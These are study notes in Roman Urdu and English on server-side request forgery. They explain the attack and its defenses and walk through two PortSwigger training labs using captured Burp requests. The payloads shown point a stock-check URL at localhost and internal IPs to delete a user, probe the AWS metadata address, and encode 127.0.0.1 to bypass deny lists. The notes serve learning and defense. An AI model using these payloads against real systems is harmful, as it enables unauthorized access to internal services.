SSRF -->>

Aik shopping application hai protected by firewall, koi bhe access kr sakta and shopping kr sakta, ab kuch functionalities ko implement krne ke lie wo services ka use krte external and internal dono ho sakte, sirf app he services se communicate kr sakta, so agar user try kre services se connect hone ke to connection denied ho jaye ga, so in other words trust hai application and services ke darmyan chaye wo third party cloud based ho yah internal services ho.

Ab imagine ham regular user hai and wpp me cupcake buy krna chate, pehle ham check krein ge kya cup cake stock me hai ?? Ham button dabai ge In stocks?? To jo service ke functionality ho ge check krne ke wo check kre ge and yeh post request ho ge, to app us service ko url bheje ga us url ke parameter me productId ho ge and jab wo cheeck kr le ga to reponse bheje ga ke itne rehte hain, ab pata chal gya ke hai to buy pe dabai ga to ab third party wale ko chale ga request from app se app url wese he de ge process kre ga third parthy and msg sent kre ga ke item purchased

What could go wrong??

-> Url jo ja rhy agar user controlable hoye matlab user change kr sakta url ko from client side before it sent to services(temper)
-> yah validate na ho, to backend check na kre url or accept kr le to kuch bhe ho sakta RCE bhe mil sakta

To stock check krne ke bajai me ne jab stock ke lie request bheje to burp proxy se admin page /admin maang loon, to ab trust relation tha app and ervice me to wo de de ga ab hamein sare items nazar ai ge page par del ke add ke view ke, lakin ham in ko delete nhi kr sakte waha se he, cz hamare request external ho ge to firewall block kr de ge, tareka ha ke right click krein add de itmes kisi par bhe and source code me jain and dekhein url kya hai for adding or deleting and re-exploit krein ssrf vuln ko by sending url that deleted or add items, to un ke darmyan trust relation hai to kaam ho jaye ga 

Or ham aik kaam kr sakte port scan kr sakte network ko, automated attack kr sakte jo sab private ip range ko scan kr leta sab servers ke, to ham dekh sakte kon se servers up hain and kon c services chal rhy un pe, to ja request app se he rhy and services ke chezein dikh jate ip wagera

Capital one 2019 attack

multiple lines defence hota 1st line 2nd line 3rd Line
Developers -> vuln scan -> vuln assessment -> pen tester -> sab ignore to attack ho jata 

SSRF occurs when an app is fetching remote resource without first validating the user supplied URL


TYPES OF SSRF ->

Regular / In-band ->

Yaha ham tamper krte url ko and hamein jo reponse hota wo app me nazar ata, ham admin ko likhte url me temper kr ke and inresult reponse hamein nazar ata page par, so agar request krte and us ka reponse hamein wapis milta wo regular yah in band hai

Blind / Out-of-band -> Is pe request ke baad response nhi ata app me, to dekhne ke lie kya vuln hai yah request accept ho gaye hamein wo http yah dns wala kaam krna prta burp collaborator wala yani jo sever attacker ke paas ho and agar hamare server par request ai to matlab ke vuln hai.

SSRF can lead to sensitive info disclosure, scan of internal network, REC, compromise of internal services.


How to find SSRF vulnerabilities ->

Black Box vs White Box testing -->>

<<<-- Black Box -->>>

Black box web app pen testing me app yah system ke bohot kam info hote, info URL ke hote aap ke paas wo he hota yeh aap samjh lo ke aap jo bug bounty krte yah web apps kisi or ke hack krte to koi info nhi hote bs jo dkh rha hota us se pata lagta

1) Map the app ->
- Identify urls, sab pages dekho, input vectors ko dekho jo backend se baat kr rhy, app kese function, logic samjho 
- For each request paramter, modify its value to specify 
- Burp collaborator yah koi or server use kr rhy us pe request ai agar to matlab ssrf out of band wala ho gya lakin agar nhi ai request to matlab yeh nhi ke ssrf vuln nhi app, us time hamein time dekhna pare ga for the app to respond because app might not be able to communicate with ur web server due to firewall, so the time taken to send back a response to your server might be slightly different if the resource itself doesnt exist and you might be able to use that to prove that an ssrf vuln exists

<<<-- White Box -->>>

Source code dia jata pura 

1) Review source code and identify all request parameters that accepts url


<<<-- Grey Box -->>>

Thore zayada info de hote sirf url nhi kuch accounts bhe de dete to is trha kuch hota


📌 SSRF hota kya hai?
👉 SSRF matlab tum server ko majboor karte ho ke woh kisi aur server pe request bheje — jo originally tumhe allowed nahi hota!

✅ Real life analogy:
Tum bank ke receptionist ko kehte ho:

“Mujhe dusre branch se secret file mangwa ke do!”

Receptionist (server) tumhari baat maan leta hai — tumhare kehne pe woh internal branch se baat karta hai.

Yahi SSRF hai!

🎯 Blackbox Perspective (jab code nahi pata)
1️⃣ Koi parameter dekho jisme URL jaa raha ho:
👉 Jaise ?url=https://example.com/file.jpg

2️⃣ Us URL ko change karke dekhte ho:
🔹 https://your-collab-id.burpcollaborator.net/
🔹 http://127.0.0.1/
🔹 http://169.254.169.254/latest/meta-data/ (AWS)

3️⃣ Burp Collaborator se dekhte ho — server request kar raha hai kya?

🎯 Whitebox Perspective (jab code mil jaye)
1️⃣ Code dekho — kya developer ne requests.get(user_url) lagaya hai?
2️⃣ Kya input filter hai? Koi blocklist hai?
3️⃣ Agar filter nahi — to attacker internal network se request banwa sakta hai.  

🔑 One-line baby summary:
SSRF = Tum input dete ho → Server tumhare kehne pe kisi aur jagah request bhejta hai → Sensitive data leak ya internal system hit hota hai.



HOW TO PREVENT SSRF VULNERABILITES -->>

Defense in depth approach -> 

1) APPLICATION LAYER DEFENSES
2) NETWORK LAYER DEFENSES


APPLICATION LAYER DEFENSES ->

1) Sanitize and validate all client supplied input data(Yeh kaam to har case me krna chaye)
2) Enforce the url schema, port, destination with a positive allow list -->> Yani aik white list banao ke sirf un he path ko request bheje ja sakte un ko white list me kro koi path jo ke white list me nhi wo block ho jaye 
3) No Sensitive Response	
Jo SSRF request mein response aaye — woh user ko na dikhao.
Warna attacker output dekh ke aur chhed-chaad karega.
4) Disable HTTP redirections -> Agar request ek URL se dusre par redirect hoti hai, woh block karo — warna attacker internal server pe ja sakta hai.

NOTE -> Do not mitigate ssrf vulns using deny lists or regular expressions -> Wo jo encode kr ke jo bataya 127.0.0.1 ko octal me convert kr ke bhej sakte to is lie in chezo ka faida nhi deny list yah regular expressions ka cz work kr jate woh.

Important Note:
Deny List/Regex par bharosa mat karo:

127.0.0.1 ko %31%32%37%2E%30%2E%30%2E%31 likh ke bypass ho sakta hai.
Octal, hex, DNS rebinding sab trick kar sakte hain.
Isliye Positive Allow List hi best practice hai.



NETWORK LAYER DEFENSES -->>

🔑 Pehlay samajho problem kya hai:
SSRF mein attacker tumhare server ko kahin bhi request bhejne par majboor kar deta hai.
Jaise:

http://169.254.169.254 → AWS metadata

http://127.0.0.1/admin → localhost admin panel

http://internal.company.com → internal servers

✅ Network Layer kya karta hai?
Application layer: Tum input validate karte ho — jaise URL check karte ho.

Network layer: Tum network/firewall rules banate ho → ke server ke bahar kya request ja sakti hai aur kya nahi.

🔒 Example #1: Firewall
Tum server ko bol do:

Allow: Sirf https://api.partner.com aur https://s3.amazonaws.com

Block: Internal IPs jaise 127.0.0.1, 169.254.169.254, 10.x.x.x ya 192.168.x.x

🔥 Iska faida kya?
Agar input se attacker URL bypass bhi kar de → request ja hi nahi payegi!
Kyun? Firewall ya VPC security group block kar dega.

🔒 Example #2: Egress Filtering
Egress = Server se bahar jaane wali traffic

Filter lagao: Server bahar sirf allowed IPs/domains pe hi request bhej sake.

🎯 Ek line mein:
🔐 Network Layer Defense = Tumhare server ko outgoing requests ko limited karna → internal IPs, metadata, local services pe request jaane hi nahi dena!

Aise SSRF se double protection hoti hai:
✅ Input validate karo (Application layer)
✅ Firewall/VPC rules/Egress filter lagao (Network layer)


Lab 1 ->
Lab: Basic SSRF against the local server



vuln parameter -> Stock check functionality

Goal -> change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

Analysis:

Sab se pehle view details ke request bup ko bheje then neche gaye us pag epar and stocks search kia london and us ko burp ko bheja

ab jo view details ko dabane ke baad burp ko request mile wo yeh ha -->>

GET /product?productId=1 HTTP/2
Host: 0aa10097034a775e81dd7f52006d00e1.web-security-academy.net
Cookie: session=L97VJfjKvavWgct7peCkZDFlO0wC27jW
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa10097034a775e81dd7f52006d00e1.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=0, i



ab jo stocks ko dabane ke baad burp ko request mile wo yeh ha -->>

POST /product/stock HTTP/2
Host: 0aa10097034a775e81dd7f52006d00e1.web-security-academy.net
Cookie: session=L97VJfjKvavWgct7peCkZDFlO0wC27jW
Content-Length: 107
Sec-Ch-Ua-Platform: "macOS"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Origin: https://0aa10097034a775e81dd7f52006d00e1.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aa10097034a775e81dd7f52006d00e1.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1


Ab is ke andar yeh jo stockapi(
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1) ka url likha yeh main cheez ha abhi yeh url encode ha -> cmd + shift + u kr ke url decode kr lein ge 

Ab yeh esa ho gaya -->>
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1

port -> 8080

Ab me ne url decode kr ke chalaya to nhi chala basically encode kr ke chalaya to chala and 300 likha a rha, 300 basically stocks me jo cheez hai wo hai us ka 300 stocks pare it means


STEPS ->
1) Pehle stockApi=http://stock.weliketoshop.net:8080/ bs itna url dekho yani aage koi query strings yah parameter yah path na do or dekho accept krta ke nhi? Abhi is case me nhi kr rha, matlab sab provide krna pare ga

2) Ab check kro localhost pe chal rhy app stockApi=http://localhost so reponse a gya 200 matlab ssrf vuln hai, ab is ke baad hua yeh ke jaaha home likha hota waha admin panel likha nazar a rha lakin yeh sab burp ke render se dekh rha asli app me esa kuch nhi hua abhi, to ye burp me render ho rha cz burp actual response lata, burp render actual response dikhata, browser is lie nhi dikha rha cz koi session yah cookie nhi ig ham ne login nhi kia tha is lie waha anzar nhi aya admin panel, ab me ne code dekha to waha yeh likha tha 

<a href="/admin">Admin panel</a>

yani yeh /admin likhu ga age to dekh saku ga, to local host me jane ke lie localhost kia and admin me jane ke lie /admin likha aage

http://localhost/admin 

-> To yeh likha render kia to mujhe Users nazar a rhy carlos and wiener delete kr sakta in ko, lakin delete wese nhi kr sakta, un ka /path dekhna pare ga inspect kr ke burp me code dekho Raw me dekhna 

 <div>
    <span>wiener - </span>
    <a href="/admin/delete?username=wiener">Delete</a>
</div>
<div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>

-> To ab is ke request bhejne pare ge and del ho ga tab


-> Is se del ho ga
http://localhost/admin/delete?username=carlos

-> To is se del ho ga and 401 unauthorized ai ga to waja is ke yeh hai ke ham external perspective se kar rhy access admin page ko, to dekhne ke lie ke work kr rha ke nhi admin dubara kholo and dekho waha user hai ke nhi?? To nhi and lab solve ho gaye






Lab -> 2
Basic SSRF against another back-end system 

Vuln feature -> Stock exchange functionality

Goal -> use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.

Analysis ->

To ab is case me me ne dusre system par yani service par attack bheejna, pechle lab me use app par kia tha ab app se next services par, neeche likh rha jo aya url me ne decode kar lia TARGET_IPHONE_SIMULATOR

POST /product/stock HTTP/2
Host: 0a7300ea030db9ba8037815c007800fe.web-security-academy.net
Cookie: session=4ddnJwt8aw3qDbe1JOPAMLpAxtv2QYLW
Content-Length: 96
Sec-Ch-Ua-Platform: "macOS"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Origin: https://0a7300ea030db9ba8037815c007800fe.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a7300ea030db9ba8037815c007800fe.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i

stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1

Ab dubara se 8080 tak likho or dekho accept kr rha?

stockApi=http://192.168.0.1:8080 -> Nhi kr rha

So ab ham kya karein ge ips ko change krein g 0 se 255 tak hote ham intruder se krein ge and aik sawal ata ke ips se kyun kr rhy cz Local network mein mostly hostnames nahi hote — sirf private IPs hoti hain.

stockApi=http://192.168.0.1:8080
stockApi=http://192.168.0.2:8080
stockApi=http://192.168.0.3:8080
stockApi=http://192.168.0.4:8080

<p class=is-warning>Could not connect to external stock check service</p> Yeh dekho nhi a rha koi 

is trha check krein ge lakin 0 se 255 tak krna intruder ka use krein ge to jo to local network (((SSRF ke context mein jo “local network service” hoti hai wo basically internal servers ya services hoti hain jo publicly direct access nahi hoti — sirf application ke through accessible hoti hain))) ke ip se match kar gya waha pe kisi or trha ka status ai ga us ko ham ne pakar lena

To ab mujhe 244 par mil gya 404 baki sab 400 yah 500 the ab is ko agar me dekhu khol ke to a rha not found is ka matlab ha ke server running me hai lakin general parent page exist nhi krta yani wo pag exist nhi krta kuch age kru ga /admin to khule ga na lakin response aya matlab port pr run ho rha yeh samjh jao, to phir is wale ko repeater me bhejein ge and /admin laga ge age and users a jaye ge then un ko delete kr dein ge un ka /path jo del ka hai us se Raw kro ge to nazar a jaye ga, baki lab 1 wala tareka hai. To jo port yah service ko me jab enter kr rha tha and not found a rha tha matlab wo page nhi tha me ne /admin lagaya to matlab us service ke functionality admin ke the ke jab app us se kahe to wo admin ko login hone de kuch esa, khair yeh kese pata chale ge ke /admin he the us ke functionality?? Kuch or bhe to ho sakte 

➡️ Koi magic nahi hai — ye real me guess + info gathering + fuzzing se hi pata chalta hai.

Default common paths guess karo
Internal services ke common paths mostly ye hote hain:

/admin
/status
/health
/metrics
/debug
/internal
/config
/api
Yeh standard hote hain — isliye pehle ye try karo.





Neeche me de rha sara jis 244 port ko me ne nikaaala


POST /product/stock HTTP/2
Host: 0a7300ea030db9ba8037815c007800fe.web-security-academy.net
Cookie: session=4ddnJwt8aw3qDbe1JOPAMLpAxtv2QYLW
Content-Length: 35
Sec-Ch-Ua-Platform: "macOS"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Origin: https://0a7300ea030db9ba8037815c007800fe.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a7300ea030db9ba8037815c007800fe.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i
Connection: close

stockApi=http://192.168.0.244:8080/

stockApi=http://192.168.0.244:8080/admin likho to a jaye ge wo name ko del krne ke lie

stockApi=http://192.168.0.244:8080/admin/delete?username=carlos -> Del ho gya 